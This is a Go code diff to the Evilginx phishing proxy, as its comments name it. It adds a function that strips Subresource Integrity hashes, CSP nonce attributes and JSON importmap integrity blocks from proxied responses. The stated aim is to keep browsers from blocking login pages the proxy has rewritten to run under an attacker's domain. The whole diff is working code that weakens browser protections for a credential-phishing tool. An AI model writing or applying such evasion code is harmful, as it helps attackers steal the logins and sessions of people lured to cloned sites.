@@ -1799,6 +1799,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// Remove SRI integrity attributes and CSP nonces from HTML/JS/JSON responses
+				// to prevent browser blocking. Evilginx modifies response bodies (URL rewriting,
+				// domain substitution) which breaks Subresource Integrity hash verification.
+				if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
+					body = p.removeSriIntegrity(body)
+				}
+
 				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 				resp.ContentLength = int64(len(body))
 				resp.Header.Del("Content-Length")
@@ -2645,6 +2652,91 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 	}
 
 	return false
+}
+
+// removeSriIntegrity removes Subresource Integrity (integrity) and CSP nonce attributes
+// from HTML/JS/JSON responses, as well as JSON importmap integrity blocks.
+// This is necessary because Evilginx modifies response bodies (URL rewriting, domain substitution, etc.)
+// which changes the content hash. Without removing these attributes, browsers will block
+// the modified resources due to hash mismatch or CSP nonce mismatch.
+//
+// Handles:
+// 1. HTML attribute: <script src="..." integrity="sha256-..."></script>
+// 2. HTML attribute: <script nonce="abc">...</script>
+// 3. JSON importmap: {"integrity": {"/path.js": "sha384-...", ...}}
+// sriTagRe matches an HTML opening tag (from '<' to '>') to scope attribute removal.
+// [^>]*? ensures we stay within a single tag boundary and don't bleed into JS strings or text content.
+var sriTagRe = regexp.MustCompile(`<\w+[^>]*?>`)
+var sriIntegrityAttrRe = regexp.MustCompile(`\s+integrity\s*=\s*(?:"[^"]*"|'[^']*')`)
+var sriNonceAttrRe = regexp.MustCompile(`\s+nonce\s*=\s*(?:"[^"]*"|'[^']*')`)
+
+func (p *HttpProxy) removeSriIntegrity(body []byte) []byte {
+	// Scope integrity/nonce removal to HTML tags only, avoiding false positives
+	// in JavaScript strings, template literals, or code that mentions these attribute names.
+	body = sriTagRe.ReplaceAllFunc(body, func(tag []byte) []byte {
+		tag = sriIntegrityAttrRe.ReplaceAllLiteral(tag, nil)
+		tag = sriNonceAttrRe.ReplaceAllLiteral(tag, nil)
+		return tag
+	})
+	// Remove JSON importmap blocks: "integrity": { ... } (handles nested braces)
+	body = removeJsonIntegrityBlocks(body)
+	return body
+}
+
+// removeJsonIntegrityBlocks removes "integrity": { ... } entries from JSON importmaps.
+// Uses brace-depth counting to correctly handle nested objects.
+func removeJsonIntegrityBlocks(body []byte) []byte {
+	key := []byte(`"integrity"`)
+	for {
+		idx := bytes.Index(body, key)
+		if idx == -1 {
+			break
+		}
+		// Find the colon after "integrity"
+		rest := body[idx+len(key):]
+		colonIdx := bytes.IndexByte(rest, ':')
+		if colonIdx == -1 {
+			break
+		}
+		rest = rest[colonIdx+1:]
+		// Find the opening brace
+		braceStart := bytes.IndexByte(rest, '{')
+		if braceStart == -1 {
+			break
+		}
+		// Count brace depth to find the matching closing brace
+		depth := 0
+		end := -1
+		for i := braceStart; i < len(rest); i++ {
+			switch rest[i] {
+			case '{':
+				depth++
+			case '}':
+				depth--
+				if depth == 0 {
+					end = i + 1
+				}
+			}
+			if end != -1 {
+				break
+			}
+		}
+		if end == -1 {
+			break
+		}
+		// Calculate absolute end position in body
+		absStart := idx
+		absEnd := idx + len(key) + colonIdx + 1 + braceStart + end
+		// Remove trailing comma if present to keep JSON valid
+		if absEnd < len(body) && body[absEnd] == ',' {
+			absEnd++
+		} else if absEnd < len(body) && absStart > 0 && body[absStart-1] == ',' {
+			// Remove leading comma instead
+			absStart--
+		}
+		body = append(body[:absStart], body[absEnd:]...)
+	}
+	return body
 }
 
 func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
